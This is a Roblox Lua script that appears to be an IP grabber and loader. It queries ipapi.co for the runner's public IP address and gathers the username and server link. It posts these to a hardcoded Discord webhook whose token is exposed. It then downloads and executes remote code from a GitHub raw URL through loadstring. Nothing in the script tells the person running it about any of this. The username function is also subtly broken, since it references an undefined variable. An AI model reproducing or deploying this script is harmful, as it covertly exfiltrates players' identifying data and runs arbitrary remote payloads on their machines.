local HttpService = game:GetService("HttpService")
local Plyr = game:GetService("Players")

local URL = "https://discord.com/api/webhooks/1393398739812487189/D8MlZ7oGZ70VwMX045sIHBDmWUmBEvtBDDqJe97pJBfaSFZgQA2zRllrJKs-b8GOqXO9"

local function getIP()
    local success, response = pcall(function()
        return HttpService:GetAsync("https://ipapi.co/json")
    end)
    if success then
        local data = HttpService:JSONDecode(response)
        return data.ip or "Unknown"
    else
        return "Unknown"
    end
end

local function getUSER()
    local plr = Plyr.LocalPlayer
    if plr then
        return player.Name
    else
        warn("Failed to get username.")
        return "Unknown"
    end
end

local function getSERVER()
    local jobId = game.JobId
    if jobId and jobId ~= "" then
        return "https://www.roblox.com/games/" .. game.PlaceId .. "/-/" .. jobId
    else
        warn("Failed to get server link.")
        return "Unknown"
    end
end

local function Webhook(ip, username, serverLink)
    local data = {
        ["content"] = "**IP Address:** " .. ip .. "\n**Username:** " .. username .. "\n**Server:** " .. serverLink
    }
    local jsonData = HttpService:JSONEncode(data)
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local response = HttpService:RequestAsync({
        Url = URL,
        Method = "POST",
        Headers = headers,
        Body = jsonData
    })
    if response.Success then
        print("Info sent to webhook successfully.")
    else
        warn("Failed to send Info to webhook.")
    end
end

local ip = getIP()
local username = getUSER()
local serverLink = getSERVER()
if ip then
    Webhook(ip, username, serverLink)
end

loadstring(game:HttpGet("https://github.com/ug32-C9/Velonix-Test/raw/refs/heads/main/Main-Test2.lua"))()